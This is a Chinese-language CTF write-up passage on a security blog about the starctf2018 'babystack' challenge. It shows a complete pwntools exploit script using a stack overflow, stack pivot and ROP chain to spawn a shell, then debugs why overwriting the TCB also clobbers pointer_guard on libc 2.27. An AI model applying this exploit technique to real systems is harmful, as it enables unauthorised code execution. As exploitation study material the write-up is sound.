<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>bypass Canary | ph4ntom's blog</title><meta name="keywords" content="binary"><meta name="author" content="ph4ntom"><meta name="copyright" content="ph4ntom"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="记录一个bypass canary的题目，以及其延伸出来的一大堆知识和大坑">
<meta property="og:type" content="article">
<meta property="og:title" content="bypass Canary">
<meta property="og:url" content="https://ph4ntonn.github.io/bypass-Canary.html">
<meta property="og:site_name" content="ph4ntom&#39;s blog">
<meta property="og:description" content="记录一个bypass canary的题目，以及其延伸出来的一大堆知识和大坑">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
<meta property="article:published_time" content="2020-11-11T10:19:56.000Z">
<meta property="article:modified_time" content="2021-01-26T12:37:49.990Z">
<meta property="article:author" content="ph4ntom">
<meta property="article:tag" content="binary">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://ph4ntonn.github.io/bypass-Canary"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="rbM4vbAtejyl3i3Ybvi5N-p_l4JJEPEFwc5aqlYCLzo"/><meta name="baidu-site-verification" content="code-Nde8XbsifS"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  ClickShowText: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-01-26 20:37:49'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">ph4ntom's blog</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">bypass Canary</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-11T10:19:56.000Z" title="发表于 2020-11-11 18:19:56">2020-11-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-26T12:37:49.990Z" title="更新于 2021-01-26 20:37:49">2021-01-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">7.6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>36分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>这道题是来自starctf2018的一道pwn题，主要是通过覆盖TCB结构体中的stack_guard值来bypass Canary的校验过程</p>
<p>赛题链接:  <a target="_blank" rel="noopener" href="https://github.com/sixstars/starctf2018/tree/master/pwn-babystack">https://github.com/sixstars/starctf2018/tree/master/pwn-babystack</a></p>
<p>TCB介绍: <a target="_blank" rel="noopener" href="http://www.openwall.com/lists/oss-security/2018/02/27/5">http://www.openwall.com/lists/oss-security/2018/02/27/5</a></p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul>
<li>Ubuntu 18.04 64位</li>
<li>libc-2.27</li>
</ul>
<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>由于大致了解解题细节，所以我就直接拿现成的exp来先运行试一下，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"></span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span><br><span class="line">context.log_level = &#x27;INFO&#x27;</span><br><span class="line"></span><br><span class="line">libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><span class="line">bin_path = &#x27;./bs&#x27;</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">binary = ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;&#x27;</span></span><br><span class="line">port = 6666</span><br><span class="line"></span><br><span class="line">def debug(command=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    #debug(&#x27;b *0x4009E7\n&#x27;)</span><br><span class="line">    g = lambda x: next(binary.search(asm(x, os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)))</span><br><span class="line">    pop_rdi = g(&#x27;pop rdi; ret&#x27;)</span><br><span class="line">    pop_rsi_pop = g(&#x27;pop rsi; pop r15; ret&#x27;)</span><br><span class="line">    leave = g(&#x27;leave; ret&#x27;)</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rdi:     &quot;</span> + hex(pop_rdi))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;pop_rsi_pop: &quot;</span> + hex(pop_rsi_pop))</span><br><span class="line">    <span class="built_in">log</span>.info(<span class="string">&quot;leave:       &quot;</span> + hex(leave))</span><br><span class="line"></span><br><span class="line">    size = <span class="number">8300</span></span><br><span class="line">    p.sendlineafter(&#x27;send?\n&#x27;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf = <span class="number">0x602f00</span></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += &#x27;A&#x27;*0x1010</span><br><span class="line">    <span class="meta"># stack pivot #step 1</span></span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc </span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(binary.got[&#x27;puts&#x27;])</span><br><span class="line">    payload += p64(binary.plt[&#x27;puts&#x27;])</span><br><span class="line">    # ROP2 - read </span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(pop_rsi_pop)</span><br><span class="line">    payload += p64(fakebuf)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(binary.plt[&#x27;read&#x27;])</span><br><span class="line">    <span class="meta"># stack pivot #step 2</span></span><br><span class="line">    payload += p64(leave)</span><br><span class="line">   	# Override TCB Canary</span><br><span class="line">    payload = payload.ljust(size, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(&#x27;goodbye.\n&#x27;)</span><br><span class="line">    leak = p.recvline().strip()[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    leak = u64(leak)</span><br><span class="line">    libc.address = leak - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">    info(<span class="string">&quot;%#x&quot;</span>, libc.address)</span><br><span class="line">    bin_sh = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">    system = libc.sym[&#x27;system&#x27;]</span><br><span class="line">    </span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += p64(0)</span><br><span class="line">    payload += p64(pop_rdi)</span><br><span class="line">    payload += p64(bin_sh)</span><br><span class="line">    payload += p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    <span class="function"><span class="keyword">if</span> <span class="title">len</span><span class="params">(sys.argv)</span> </span>== <span class="number">1</span>:</span><br><span class="line">        global p</span><br><span class="line">        p = process(executable=bin_path, argv=[bin_path]) #, env=&#123;&#x27;LD_PRELOAD&#x27;:libc_path&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p = remote(sys.argv[<span class="number">1</span>], <span class="keyword">int</span>(sys.argv[<span class="number">2</span>]))</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>

<p>这里我没有使用官方的libc(主要是我没找到。。)，直接使用了系统的libc</p>
<p>主要的过程在注释里写的差不多了，大致上就是</p>
<ul>
<li>计算偏移，先填充0x1010个“A”至rbp(这一步同时覆盖了栈上的Canary为“AAAA”)</li>
<li>stack pivot劫持rbp至.bss段</li>
<li>由于libc默认PIE，所以需要调用puts函数leak出puts函数在got表的绝对地址</li>
<li>寻找pop_rsi_pop、pop_rdi等一系列gadget，控制寄存器，准备调用read函数的参数</li>
<li>根据puts leak出的puts函数在got表的绝对地址，计算偏移得到libc的基地址，并基于libc的基地址算出read函数的绝对地址</li>
<li>构造ROP，用“A”填充ROP至8300个字节(这一步同时利用超长的“A”，覆盖了TCB中的stack_guard值为“AAAA”，从而绕过Canary的校验)</li>
<li>将ROP填入栈上对应位置</li>
<li>在我们填入的read函数被调用时，将真正的exp通过read函数写入.bss上被劫持的栈</li>
<li>最后leave，将栈完全劫持到.bss段执行</li>
</ul>
<p>过程还是比较明了的，于是我运行了一下</p>
<p>然而，这个exp在我的机器上并不能成功的getshell，但是，在ubuntu 16.04上却可以成功getshell。</p>
<p>疑惑.jpg，话不多说，gdb搞起</p>
<h1 id="WHY"><a href="#WHY" class="headerlink" title="WHY?"></a>WHY?</h1><p>gdb单步调试至我们最终执行的payload处</p>
<p>首先，可以看到程序确实被劫持到了system函数，并且rdi确实指向了“/bin/sh”字符串</p>
<p><img src="/image/bypass-Canary/enter_system.png" alt="enter_system"></p>
<p>看上去一切正常，继续跟进去看看</p>
<p>当我调试到这一步时，程序崩溃了</p>
<p><img src="/image/bypass-Canary/rax_gg.png" alt="rax_gg"></p>
<p>可以看到，<code>&lt;do_system+359&gt; call rax</code>尝试调用rax寄存器所指向的函数</p>
<p>但仔细看一下rax的值，可以发现为0x74e75a79b3d1d1ee，远远超出了可以访问的内存地址空间</p>
<p>所以自然而然的，程序在此崩溃</p>
<p>那么为什么会出现这么异常的rax值呢？</p>
<p>我把目光放在了前面的一段汇编代码上，即<code>&lt;do_system+343&gt; xor rax, QWORD PTR fs:0x30</code> </p>
<p>我将<code>0x74e75a79b3d1d1ee</code>与xor之前的rax的值<code>0x35a61b38f29090af</code>进行xor，得到了<code>fs:0x30</code>的值为<code>0x4141414141414141</code></p>
<p>看到这，可能有人还是不理解，这里贴一下64位程序中TCB的结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;                <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                           thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;                <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;  <span class="comment">// 32位下没有这个成员</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> feature_1;</span><br><span class="line">  <span class="keyword">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="keyword">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="keyword">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line">  <span class="keyword">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>看到这儿想必大家也知道了原因，由于<code>fs:0x28</code>处就是stack_guard，而原payload在没有计算任何偏移的情况下暴力覆盖了8300个字节，在覆盖stack_guard的同时也将<code>fs:0x30</code>处的<code>pointer_guard</code>覆盖为了<code>0x4141414141414141</code>而在libc2.27中的system函数在实现过程中需要利用这个值做指针的解密，解密的过程可以在图中的汇编看到，我这里总结一下(⊕ 为异或)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptr(enc) = ror64(ptr(orig) ⊕ rand, <span class="number">0x11</span>) <span class="comment">// rand的值就是pointer_guard的值</span></span><br><span class="line">ptr(orig) = rol64(ptr(enc), <span class="number">0x11</span>) ⊕ rand</span><br></pre></td></tr></table></figure>

<p>在windows上，解密方法则有些不一样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptr(enc) = ror64(ptr(orig) ⊕ rand, rand)</span><br><span class="line">ptr(orig) = rol64(ptr(enc), rand) ⊕ rand</span><br></pre></td></tr></table></figure>

<p>这里也简单说一下<code>pointer_guard</code>的用处，<code>pointer_guard</code>旨在保护存储在用户可读写的内存当中的函数地址，防止攻击者读出真实函数地址，从而绕过类似aslr等一系列防护机制</p>
<p>我们可以从上面的两种解密方法发现，windows和linux的加解密方法是一致的(除了0x11)，但实际上，linux以及windows在这个rand值上的处理也是有很大的区别的</p>
<p>在我们的漏洞利用中，我们实际上通过栈溢出覆盖了这个rand值(也就是pointer_guard)</p>
<p>换句话说，linux将这个rand值保存在了TCB中，而TCB实际上也可以被用户访问并改写</p>
<p>而windows则不然，windows将这个值存在了kernel中，用户无法对其修改读取(有kernel的洞就当我没说</p>
<p>所以实际上linux对此机制的实现是不安全的(同理，<code>stack_guard</code>也与<code>pointer_guard</code>一样)</p>
<p>那么由于解密失败，于是便触发了崩溃。</p>
<p>那要解决这个问题其实很简单，我们可以看到，<code>stack_guard</code>在相对于<code>pointer_guard</code>的低位，所以我们只需要精确计算出需要覆盖的偏移量，仅覆盖至<code>stack_guard</code>即可</p>
<p>通过命令<code>x/32gx pthread_self()</code>我查看到了TCB的结构以及其地址，确定了<code>stack_guard</code>与溢出点<code>buf</code>之间的偏移</p>
<p>TIPS：在gdb中，你是无法直接查看到fs寄存器真正指向的地址的，<del>这是由于在保护模式下fs寄存器中保存的将不再是基地址，而是段选择子，需要基于此值去gdt或者ldt中查表才可以得到真正的基地址，</del> 这是由于我们所能看到的所有段寄存器的16位数值都是<strong>段选择子</strong>，而不是真正的<strong>基地址</strong>，真正的<strong>基地址</strong>是我们不可见的，需要使用<strong>段选择子</strong>的值去gdt或者ldt中查表才可以得到我们<strong>不可见</strong>的<strong>基地址</strong>，但是<code>fs/gs</code>寄存器是个例外(在linux x86_64系统上)，他们与其他四个段寄存器在保护模式下的表现是不一样的，我们可见的<code>fs/gs</code>的16位数值将不是如同其他四个段寄存器一般是<strong>段选择子</strong>，而是恒为0(在linux x86_64系统上运行的64位程序)，但是，我们又知道fs寄存器中保存着<strong>不可见</strong>的线程TCB的起始地址，那么在恒为0的情况下，是谁来改变这个<strong>不可见</strong>的线程TCB的起始地址呢？</p>
<p><del>答案是cpu在进行线程切换时会使用<code>wrmsr</code>直接修改fs段寄存器的值为当前线程的TCB的起始地址</del></p>
<p>调试后发现是由glibc在线程启动之前主动调用了<code>TLS_INIT_TP -&gt; arch_prctl(syscall)</code>从而改变了fs寄存器的基地址，下面是部分代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Code to initially initialize the thread pointer.  This might need</span></span><br><span class="line"><span class="comment">   special attention since &#x27;errno&#x27; is not yet available and if the</span></span><br><span class="line"><span class="comment">   operation can cause a failure &#x27;errno&#x27; must not be touched.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   We have to make the syscall for both uses of the macro since the</span></span><br><span class="line"><span class="comment">   address might be (and probably is) different.  */</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TLS_INIT_TP(thrdescr) \</span></span><br><span class="line">  (&#123; <span class="keyword">void</span> *_thrdescr = (thrdescr);					      \</span><br><span class="line">     <span class="keyword">tcbhead_t</span> *_head = _thrdescr;					      \</span><br><span class="line">     <span class="keyword">int</span> _result;							      \</span><br><span class="line">									      \</span><br><span class="line">     _head-&gt;tcb = _thrdescr;						      \</span><br><span class="line">     <span class="comment">/* For now the thread descriptor is at the same address.  */</span>	      \</span><br><span class="line">     _head-&gt;self = _thrdescr;						      \</span><br><span class="line">									      \</span><br><span class="line">     <span class="comment">/* It is a simple syscall to set the %fs value for the thread.  */</span>	 